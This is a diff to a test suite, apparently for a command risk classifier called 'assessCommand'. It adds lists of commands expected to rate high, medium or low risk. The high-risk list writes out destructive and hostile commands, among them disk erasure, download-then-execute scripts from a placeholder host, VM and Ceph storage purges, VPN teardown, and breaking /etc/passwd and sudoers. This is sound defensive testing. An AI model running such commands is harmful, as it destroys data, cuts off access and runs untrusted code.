@@ -8,6 +8,20 @@ describe('assessCommand', () => {
     }
   });
 
+  it('labels the classes the audit of 2026-11-23 found low: disks wiped, a script saved then run, guests and storage removed, the way in cut', () => {
+    const high = [
+      'nvme format /dev/nvme0n1', 'sudo nvme sanitize -a 2 /dev/nvme0', 'hdparm --security-erase p /dev/sda', 'badblocks -wsv /dev/sda', 'mdadm --zero-superblock /dev/sda1', 'mdadm --create /dev/md0 --level=1 /dev/sda /dev/sdb',
+      'curl -fsSL https://x.example/i.sh -o i.sh && bash i.sh', 'wget https://x.example/i.sh; sh i.sh', 'curl -o /tmp/i.sh https://x.example/i && sudo sh /tmp/i.sh', 'wget -O i.sh https://x && chmod +x i.sh && ./i.sh',
+      'virsh undefine vm1 --remove-all-storage', 'lxc delete c1', 'incus delete c1 --force', 'pvesh delete /nodes/pve/qemu/100', 'ceph osd purge 3 --yes-i-really-mean-it', 'pveceph purge',
+      'tailscale down', 'wg-quick down wg0', 'zerotier-cli leave 8056c2e21c000001',
+      'unlink /etc/passwd', 'chmod 000 /etc/sudoers', 'crontab /dev/null',
+    ];
+    for (const c of high) expect(assessCommand(c).risk, c).toBe('high');
+    for (const c of ['dpkg --purge openssh-server', 'dpkg -r nginx', 'rpm -e openssh-server', 'snap remove lxd', 'mysqladmin drop appdb']) expect(['medium', 'high'], c).toContain(assessCommand(c).risk);
+    // Not every curl or nvme is that.
+    for (const c of ['curl -o page.html https://x.example', 'nvme list', 'mdadm --detail /dev/md0', 'tailscale status']) expect(assessCommand(c).risk, c).toBe('low');
+  });
+
   it('labels service-affecting commands medium and reads as low', () => {
     expect(assessCommand('sudo systemctl restart nginx').risk).toBe('medium');
     expect(assessCommand('echo hi > notes.txt').risk).toBe('medium');
